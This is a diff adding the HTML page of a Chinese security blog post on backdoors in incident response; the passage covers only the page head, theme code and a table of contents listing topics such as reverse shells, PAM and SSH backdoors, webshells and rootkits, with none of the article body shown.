@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.4.0 -->
+    <script>window.materialVersion = "1.4.0"</script>
+
+    <!-- Title -->
+    
+    <title>
+        
+            安全应急之后门篇 | 
+        
+        L0gs 4 xF0rk
+    </title>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    
+    
+    
+    
+    
+        <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    
+    
+    
+        <link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
+    
+    
+    
+    
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="theme-color" content="#2196F3">
+    <meta name="author" content="xF0rk">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content=",安全应急,后门入侵">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/favicon.jpg">
+    <link rel="icon" sizes="192x192" href="/img/favicon.jpg">
+    <link rel="apple-touch-icon" href="/img/favicon.jpg">
+
+    <!--iOS -->
+    <meta name="apple-mobile-web-app-title" content="Title">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="480">
+
+    <!-- Add to homescreen for Chrome on Android -->
+    <meta name="mobile-web-app-capable" content="yes">
+
+    <!-- Add to homescreen for Safari on iOS -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="L0gs 4 xF0rk">
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="https://l0gs.xf0rk.space">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="安全应急之后门篇 | L0gs 4 xF0rk">
+    <meta property="og:image" content="/img/favicon.jpg">
+    <meta property="og:description" content="">
+    <meta property="og:article:tag" content="安全应急"> <meta property="og:article:tag" content="后门入侵"> 
+
+    
+        <meta property="article:published_time" content="10月 04, 2018">
+        <meta property="article:modified_time" content="1月 22, 2019">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:title" content="安全应急之后门篇 | L0gs 4 xF0rk">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="/img/favicon.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://l0gs.xf0rk.space">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="https://l0gs.xf0rk.space/2018/10/04/about-the-backdoor/index.html">
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "L0gs 4 xF0rk",
+        "logo": "/img/favicon.jpg"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "xF0rk",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/favicon.jpg"
+        },
+        "description": "归来仍少年"
+    },
+    "headline": "安全应急之后门篇",
+    "url": "https://l0gs.xf0rk.space/2018/10/04/about-the-backdoor/index.html",
+    "datePublished": "10月 04, 2018",
+    "dateModified": "1月 22, 2019",
+    "description": "",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://l0gs.xf0rk.space"
+    }
+}
+</script>
+
+
+    
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+materialVersion+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(data&&data.indexOf(versionString)===-1){lsloader.removeLS(key)}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload){cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}code=code.split(versionString)[1];if(/\.js?.+$/.test(versionNumber)){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload)}};lsloader.requestResource=function(name,path,cssonload){var that=this;if(/\.js?.+$/.test(path)){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else if(/\.css?.+$/.test(path)){this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
+
+    <!-- Import CSS & jQuery -->
+    
+        <style id="css/material.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/material.min.css","/css/material.min.css?fJTiM/K1J3dWIruo3pxtAw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
+        <style id="css/style.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/style.min.css","/css/style.min.css?oCSEO3ST+aEypEwttTDI9g==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
+        
+        
+            <style>
+    
+    
+    .footer-sns-twitter {
+        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHptNTMyLjggMjA1YzEwIDQgMjMgMTAuOCAyOC44IDE1LjIgMTIuNiA5LjIgMTYuNiAxMC42IDI5LjQgOS40IDYuNi0uNiAxMy0zLjIgMjAuNC04LjIgMTEuMi03LjYgMTkuNC05LjIgMjMuNi01IDMuNiAzLjYgMi44IDktMi44IDE4LjYtNy4yIDEyLjQtNiAxOC44IDQuMiAyNC4yIDQuNCAyLjIgOC4yIDUuNiA4LjYgNy40IDEgNC44LTEyLjYgMjQuMi0yMiAzMS44LTExLjggOS4yLTE3LjIgMjIuNi0xOS42IDQ3LjgtNC44IDUwLjQtNy44IDY2LjYtMTYuNCA4NS40LTMgNy03IDE3LjgtOC44IDI0LTEuOCA2LjQtNSAxNC42LTcuNCAxOC40LTIuMiAzLjgtNy40IDEzLTExLjQgMjAuNC0xNy4yIDMwLjgtNDMuNCA2MS40LTcxLjQgODMuOC0yNS42IDIwLjQtNDYgMzMuMi02NC4yIDQwLjItOC40IDMuMi0xOCA3LjYtMjEuNCA5LjYtNy40IDQuNi0yMi40IDguNi01Ny4yIDE1LTYyLjIgMTEuNi03OS4yIDExLjQtMTM1LjYtMS0zMi40LTctMzguNi05LTUyLTE2LjgtMjEuNC0xMi42LTI0LjItMTQuOC0yNC4yLTE5LjQgMC02LjIgMTAuMi05LjIgMzUtMTAuNCAyMi40LTEgMjguNi0yLjYgNTctMTQuMiAyMy44LTkuOCAyOS40LTEyLjggMzAuNC0xNi44IDIuMi04LjItMy0xMy4yLTI2LjgtMjUuNC0yNS44LTEzLjItMzIuMi0xOC40LTQzLjgtMzUuOC05LTEzLjYtMTAtMjEuMi0zLjYtMzMuNiA1LjQtMTAuOCAzLjYtMTUtMTEuOC0yNS40LTktNi0xNC0xMS42LTIwLjgtMjIuNi0yMy40LTM3LjgtMjUtNTAuOC03LjItNTkuOCA0LjgtMi40IDkuNC01LjQgMTAuMi02LjYgMi44LTQuMi0uNC0xNS42LTguNC0yOS0xMS42LTE5LjYtMTMuMi0yNS44LTEzLjItNTUuMiAwLTI4LjggMi42LTM3LjggMTItNDAuMiA5LTIuMiAxNC44IDEgMzUuNiAyMC4yIDI0LjggMjIuOCA0My42IDM2LjYgNjIuOCA0NS44IDggMy44IDE3LjggOS4yIDIyIDEyIDQuMiAyLjggMTQuOCA3IDIzLjQgOS4yIDguNiAyLjIgMjQuMiA2LjggMzQuOCAxMC4yIDEzLjQgNC40IDIzLjYgNi40IDMzIDYuNiAxMi44LjIgMTQuMi0uMiAxOC42LTUuNCA0LTQuOCA0LjgtNy44IDQuOC0xOS4yIDAtMTQuNCA1LjYtMzkuNiAxMS4yLTUwLjYgNC4yLTguNCAyOS4yLTM0LjIgMzkuOC00MS40IDcuOC01LjQgMzUuNi0xNiA1Mi0yMCAxNC4yLTMuNiAzMi42LTEuMiA1Mi40IDYuOHoiLz48L3N2Zz4=);
+    }
+    
+    
+    
+    
+    
+    
+    .footer-sns-github {
+        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNCA3OGMtNi40IDEuNC0yNi40IDE0LjItMzYgMjIuOC04IDcuMi0yMiAyOS44LTI0LjQgMzkuMi0xLjYgNi40LTIgMTEzLjItMS42IDM2OCAuNiAyOTkuNCAxIDM1OS44IDMuNCAzNjQgMTEgMjAuMiAyMS42IDMyLjQgMzcuMiA0MyAxNS42IDEwLjYgMTcuMiAxMS4yIDM0LjIgMTMuMiAxMC42IDEuMiA2My40IDEuNiAxMjcuNiAxLjRsMTA5LjYtLjYgNi02LjggNi4yLTYuOC0xLjItMjUuMmMtLjgtMTUuOC0uMi0zMy40IDEuNC00Ny4yIDMtMjUuNCAxLjQtMzYuMi02LTQzLjItNS00LjYtNi4yLTQuOC0zMC42LTQuMi0yNy42LjgtMjQgMS42LTY4LjgtMTYtOC42LTMuNC0yMi42LTE4LTI4LjQtMjkuOC0xMS40LTIyLjgtMjctNDUtMzkuMi01NS42LTE0LTEyLjItMTkuOC0yMC44LTE5LjgtMjguNiAwLTExLjYgMTMuNi0xMi42IDMzLjItMi40IDE2LjYgOC44IDIwLjggMTIuNCA0MC44IDM2LjIgMjQuMiAyOC42IDMxIDMzLjYgNTQgMzkuNiAxNS4yIDQgNDIuMiAzIDUxLjQtMS44IDktNC42IDE4LTE1LjIgMjQuNC0yOS4yIDExLjQtMjQuMiA3LjQtMzEuMi0yMC42LTM2LjgtOS44LTItMjkuMi04LTQzLjQtMTMuNC00MC40LTE1LjgtNjQuNi0zNy40LTg1LjQtNzYuMi0xMS42LTIxLjgtMTUuNC0zMy0xOC4yLTUzLjYtNC4yLTMyLjItNC44LTYwLjItMS40LTg0IDMuNC0yMy44IDYuOC0zMi44IDIwLjItNTQgNC02IDguOC0xNS42IDExLTIxLjQgMy44LTEwIDMuOC0xMS42IDEtMzAtNS4yLTM0LjItMy4yLTUyLjQgNy42LTcwLjIgNy4yLTEyLjIgMTUtMTcuMiAyNC4yLTE1LjggMTIuOCAyLjIgNTIgMTcuNCA2Ni44IDI2LjIgMjYgMTUgMjkgMTUuNCA4Mi40IDcuMiAyNC42LTMuOCAzMy44LTQuMiA2MC0zLjIgMTcgLjYgNDEuNCAzIDU0IDUuMiAzOC40IDYuNiA0OS42IDUuMiA3My0xMCA2LjYtNC4yIDE3LjQtOS40IDI0LTExLjYgNi42LTIuMiAxNi01LjggMjEtOC4yIDEzLTYgMjgtNS42IDM1LjYuOCAxMi40IDEwLjQgMTguNiA0MS40IDE0LjQgNzEuNi00LjQgMzAuNi0zIDM5LjQgOC40IDUzLjggMy40IDQuNCAxMS4yIDE5LjIgMTcuNCAzMy4yTDc3NSA0NDN2NzhsLTEwIDI4Yy0xNS4yIDQzLjItMzYuOCA3My4yLTY2LjIgOTIuOC0xMy40IDguOC01NyAyNS40LTc2LjggMjktMjguMiA1LjItMzMuMiAxMi42LTIyIDMyLjIgMTEuMiAxOS40IDEyLjQgMzIuOCAxMS42IDEyOS42bC0uNiA4NS44IDUuNCA0LjZjMy42IDMgOS4yIDUuMiAxNiA2IDUuOC44IDYwLjIgMSAxMjAuNi42IDEwOC40LS42IDExMC4yLS42IDExOS01IDI0LTExLjYgNDAtMjcuNCA1MS42LTUwLjZsNS40LTExIC42LTM0N2MuNC0yMjMtLjItMzUzLjQtMS40LTM2NS0yLTE3LTIuNi0xOC42LTEzLTM0LTEwLjYtMTUuNC0yMi44LTI2LjItNDMuMi0zNy4yLTQuMi0yLjQtNjQuNi0yLjgtMzY2LTMuMi0xOTguNiAwLTM2NCAuNC0zNjcuNiAxLjR6Ii8+PC9zdmc+);
+    }
+    
+    
+    
+    
+    
+</style>
+
+        
+        <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+  }
+
+  a {
+    color: #2196F3;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #2196F3 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #2196F3 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #2196F3 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #2196F3;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+
+        <script>lsloader.load("js/jquery.min.js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==")</script>
+    
+    
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Analytics -->
+    <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-122679153-1', 'auto');ga('send', 'pageview');
+</script>
+
+    <!-- Custom Head -->
+    
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+    <!-- Left aligned menu below button -->
+    <button id="post-toc-trigger-btn" class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#后门简介"><span class="post-toc-number">1.</span> <span class="post-toc-text">后门简介</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反弹-SHELL-技术"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">反弹 SHELL 技术</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#BASH-语言"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">BASH 语言</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#JAVA-语言"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">JAVA 语言</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#PYTHON-语言"><span class="post-toc-number">1.1.3.</span> <span class="post-toc-text">PYTHON 语言</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#PERL-语言"><span class="post-toc-number">1.1.4.</span> <span class="post-toc-text">PERL 语言</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反弹-SHELL-持久化"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">反弹 SHELL 持久化</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#隐藏系统用户"><span class="post-toc-number">2.</span> <span class="post-toc-text">隐藏系统用户</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#LINUX-隐藏高权限账号"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">LINUX 隐藏高权限账号</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#WINDOWS-用户隐藏"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">WINDOWS 用户隐藏</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SUID-权限隐藏"><span class="post-toc-number">3.</span> <span class="post-toc-text">SUID 权限隐藏</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#LINUX-PAM-后门"><span class="post-toc-number">4.</span> <span class="post-toc-text">LINUX PAM 后门</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#LINUX-PAM-简介"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">LINUX PAM 简介</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PAM-LISTFILE-模块后门"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">PAM LISTFILE 模块后门</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PAM-ROOTOK-模块后门"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">PAM ROOTOK 模块后门</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#LINUX-SSH-后门"><span class="post-toc-number">5.</span> <span class="post-toc-text">LINUX SSH 后门</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#WebShell-后门"><span class="post-toc-number">6.</span> <span class="post-toc-text">WebShell 后门</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#第三方依赖库后门"><span class="post-toc-number">7.</span> <span class="post-toc-text">第三方依赖库后门</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ROOTKIT-后门"><span class="post-toc-number">8.</span> <span class="post-toc-text">ROOTKIT 后门</span></a></li></ol>
+        <!--
+        <li class="mdl-menu__item">
+            Some Action
+        </li>
+        -->
+    </ul>
+    
+
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        <!-- Custom Thumbnail -->
+        <div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(https://l0gs.xf0rk.space/2018/10/04/about-the-backdoor/backdoor_banner.jpg)">
+    
+            <p class="article-headline-p">
+                安全应急之后门篇
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar">
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>xF0rk</strong>
+        <span>10月 04, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/后门入侵/">后门入侵</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/安全应急/">安全应急</a>
+    </li></ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
